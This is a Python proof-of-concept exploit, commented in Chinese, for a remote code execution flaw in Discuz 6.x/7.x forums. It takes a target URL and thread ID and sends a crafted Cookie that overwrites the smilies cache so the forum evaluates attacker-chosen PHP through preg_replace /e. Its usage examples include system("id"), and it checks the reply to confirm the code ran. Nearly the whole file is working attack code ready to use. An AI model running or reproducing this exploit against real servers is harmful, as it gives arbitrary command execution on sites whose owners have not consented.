#!/usr/bin/env python3
"""
Discuz 7.x/6.x 全局变量防御绕过导致远程代码执行漏洞 PoC
用法：
    python3 discuz_cookie_rce.py <目标URL> <帖子ID> [PHP代码]
示例：
    python3 discuz_cookie_rce.py http://192.168.1.100:8080 10
    python3 discuz_cookie_rce.py http://192.168.1.100:8080 10 'phpinfo();'
    python3 discuz_cookie_rce.py http://192.168.1.100:8080 10 'system("id");'
"""

import sys
import requests
import re

def exploit(target, tid, php_code):
    # 目标 URL 构建
    target = target.rstrip('/')
    url = f'{target}/viewthread.php?tid={tid}&extra=page%3D1'

    # 恶意 Cookie：覆盖 $GLOBALS[_DCACHE][smilies]
    # Discuz 在解析表情时会使用 preg_replace /e 修饰符，从而导致代码执行
    # searcharray 设置为 /.*/eui 匹配所有，replacearray 为要执行的 PHP 代码
    malicious_cookie = (
        f'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; '
        f'GLOBALS[_DCACHE][smilies][replacearray]={php_code};'
    )

    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'Cookie': malicious_cookie
    }

    print(f'[*] 目标: {url}')
    print(f'[*] 注入 PHP 代码: {php_code}')

    try:
        r = requests.get(url, headers=headers, timeout=15)
    except requests.exceptions.RequestException as e:
        print(f'[-] 请求失败: {e}')
        return

    if r.status_code != 200:
        print(f'[-] 服务器返回非200状态码: {r.status_code}')
        return

    # 检测是否执行成功：如果 PHP 代码执行了，响应中会有对应输出
    # 对于 phpinfo() 会看到 phpinfo 页面特征；对于 system(id) 会看到 uid= 等
    if php_code.startswith('phpinfo'):
        if 'phpinfo' in r.text.lower():
            print('[+] 漏洞存在，phpinfo 执行成功！')
        else:
            print('[-] 未检测到 phpinfo 输出，可能不存在漏洞或帖子 ID 无效')
    elif php_code.startswith('system'):
        # system 函数输出可能出现在 HTML 中，尝试提取 uid 信息
        if 'uid=' in r.text:
            print('[+] 漏洞存在，命令执行成功！输出如下：')
            # 提取 uid= 开头的行
            match = re.search(r'uid=.*?$', r.text, re.MULTILINE)
            if match:
                print(match.group(0))
        else:
            print('[-] 未检测到 system 输出，可能不存在漏洞或执行失败')
    else:
        # 通用情况：检查是否页面出现异常（空白或报错）或包含预期字符串
        print('[+] 请求已发送，请手动检查响应是否包含预期结果。')
        print('[*] 响应长度: {} 字节'.format(len(r.text)))
        # 可选：打印前500字符
        # print(r.text[:500])

def main():
    if len(sys.argv) < 3:
        print(f'用法: {sys.argv[0]} <目标URL> <帖子ID> [PHP代码]')
        print(f'示例: {sys.argv[0]} http://target:8080 10')
        sys.exit(1)

    target = sys.argv[1]
    tid = sys.argv[2]
    php_code = sys.argv[3] if len(sys.argv) > 3 else 'phpinfo();'

    exploit(target, tid, php_code)

if __name__ == '__main__':
    main()